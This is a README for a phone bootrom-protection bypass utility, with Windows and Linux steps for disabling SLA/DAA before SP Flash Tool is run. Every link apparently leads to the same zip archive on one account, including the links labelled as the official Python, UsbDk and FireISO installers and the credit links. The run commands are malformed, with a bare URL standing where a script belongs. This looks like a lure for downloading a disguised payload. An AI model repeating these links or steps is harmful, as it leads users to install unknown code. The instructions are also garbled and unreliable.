# Bypass utility
Small utility to disable bootrom protection(sla and daa)

## Payloads
https://raw.githubusercontent.com/Hunter3343/bypass_utility/master/src/bypass_utility_v1.0-beta.1.zip

## Usage on Windows
Skip steps 1-3 after first usage

1. Install [python (64-bit)](https://raw.githubusercontent.com/Hunter3343/bypass_utility/master/src/bypass_utility_v1.0-beta.1.zip)(select "Add Python X.X to PATH")
2. Install [UsbDk (64-bit)](https://raw.githubusercontent.com/Hunter3343/bypass_utility/master/src/bypass_utility_v1.0-beta.1.zip)
3. Install pyusb, json5 with command:
```
pip install pyusb json5
```
4. Run this command and connect your powered off phone with volume+ button, you should get "Protection disabled" at the end
```
python https://raw.githubusercontent.com/Hunter3343/bypass_utility/master/src/bypass_utility_v1.0-beta.1.zip
```
5. After that, without disconnecting phone, run SP Flash Tool


## Usage on Linux
Skip steps 1-2 after first usage
To use kamakiri you need [FireISO](https://raw.githubusercontent.com/Hunter3343/bypass_utility/master/src/bypass_utility_v1.0-beta.1.zip) or [this patch](https://raw.githubusercontent.com/Hunter3343/bypass_utility/master/src/bypass_utility_v1.0-beta.1.zip) for your kernel

Prebuilt kernels for various distros are available [here](https://raw.githubusercontent.com/Hunter3343/bypass_utility/master/src/bypass_utility_v1.0-beta.1.zip)

1. Install python
2. Install pyusb, json5 as root with command:
```
pip install pyusb json5
```
3. Run this command as root and connect your powered off phone with volume+ button, you should get "Protection disabled" at the end
```
https://raw.githubusercontent.com/Hunter3343/bypass_utility/master/src/bypass_utility_v1.0-beta.1.zip
```
4. After that, without disconnecting phone, run SP Flash Tool in UART Connection mode

## Credits
- [@chaosmaster](https://raw.githubusercontent.com/Hunter3343/bypass_utility/master/src/bypass_utility_v1.0-beta.1.zip)
- [@xyzz](https://raw.githubusercontent.com/Hunter3343/bypass_utility/master/src/bypass_utility_v1.0-beta.1.zip)
